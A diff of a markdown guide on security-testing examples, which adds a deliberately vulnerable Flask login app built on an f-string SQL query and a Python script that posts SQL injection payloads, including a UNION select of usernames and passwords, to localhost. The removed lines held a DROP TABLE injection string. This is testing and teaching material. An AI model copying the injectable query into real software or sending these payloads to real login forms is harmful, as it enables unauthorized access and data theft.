@@ -54,28 +54,110 @@ Here are three specific examples of security vulnerabilities that can be tested 
    ```
    The tester script will attempt to inject various XSS payloads and report whether they were successful or not.
 
-1. **Example: SQL Injection Vulnerability**
+2. **Example: SQL Injection Vulnerability**
 
    - **Description**: Test a web application for vulnerabilities related to SQL Injection, where an attacker manipulates input to execute malicious SQL queries.
-   - **Sample Prompt**: 
+   - **Sample Prompt**: ```Write a simple web application that demonstrates SQL Injection and a python script that tests that application for SQL Injection vulnerabilities.```
    - **Test Code (Python with Flask and SQLAlchemy)**:
 
+   **app.py:**
    ```python
-   # Example vulnerable code
-   from flask import request
-
-   def execute_query(user_input):
-       query = f"SELECT * FROM users WHERE username='{user_input}'"
-       # Execute the query
-
-   # Injected malicious input by an attacker
-   malicious_input = "' OR '1'='1'; DROP TABLE users; --"
-   execute_query(malicious_input)
+   from flask import Flask, request, render_template_string
+   import sqlite3
+   
+   app = Flask(__name__)
+   
+   # Initialize the database
+   def init_db():
+       conn = sqlite3.connect('users.db')
+       c = conn.cursor()
+       c.execute('''CREATE TABLE IF NOT EXISTS users
+                    (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
+       c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'secretpassword')")
+       c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (2, 'user', 'userpassword')")
+       conn.commit()
+       conn.close()
+   
+   init_db()
+   
+   @app.route('/', methods=['GET', 'POST'])
+   def login():
+       error = None
+       if request.method == 'POST':
+           username = request.form['username']
+           password = request.form['password']
+           
+           # Vulnerable SQL query
+           query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+           
+           conn = sqlite3.connect('users.db')
+           c = conn.cursor()
+           c.execute(query)
+           user = c.fetchone()
+           conn.close()
+           
+           if user:
+               return f"Welcome, {user[1]}!"
+           else:
+               error = "Invalid credentials"
+       
+       return render_template_string('''
+           <h1>Login</h1>
+           {% if error %}
+           <p style="color: red;">{{ error }}</p>
+           {% endif %}
+           <form method="post">
+               Username: <input type="text" name="username"><br>
+               Password: <input type="password" name="password"><br>
+               <input type="submit" value="Login">
+           </form>
+       ''', error=error)
+   
+   if __name__ == '__main__':
+       app.run(debug=True)
    ```
+   This application is vulnerable to SQL Injection because it directly incorporates user input into the SQL query without proper sanitization.
 
-   In this example, an attacker injects a malicious SQL query that could lead to unintended consequences. This can be tested by injecting the malicious input and observing if it affects the database.
+    **test_sql_injection.py:**
+   ```python
+   import requests
+   
+   def test_sql_injection(url):
+       # Test cases
+       payloads = [
+           "' OR '1'='1",
+           "' OR '1'='1' --",
+           "' UNION SELECT 1, username, password FROM users --",
+           "admin' --",
+           "' OR 1=1 --",
+       ]
+   
+       for payload in payloads:
+           data = {
+               'username': payload,
+               'password': 'anything'
+           }
+           response = requests.post(url, data=data)
+           
+           print(f"Payload: {payload}")
+           print(f"Response: {response.text}")
+           print(f"Status Code: {response.status_code}")
+           print("-" * 50)
+   
+           if "Welcome" in response.text:
+               print("SQL Injection vulnerability detected!")
+               return True
+   
+       print("No SQL Injection vulnerability detected.")
+       return False
+   
+   if __name__ == "__main__":
+       url = "http://localhost:5000"  # Change this to the URL of your Flask app
+       test_sql_injection(url)
+   ```
+   The testing script will attempt various SQL Injection payloads and report if any vulnerabilities are detected.
 
-2. **Example: Remote Code Execution (RCE) Vulnerability**
+4. **Example: Remote Code Execution (RCE) Vulnerability**
 
    - **Description**: Test a system for vulnerabilities related to Remote Code Execution, where an attacker can execute arbitrary code on a server.
    - **Sample Prompt**: 
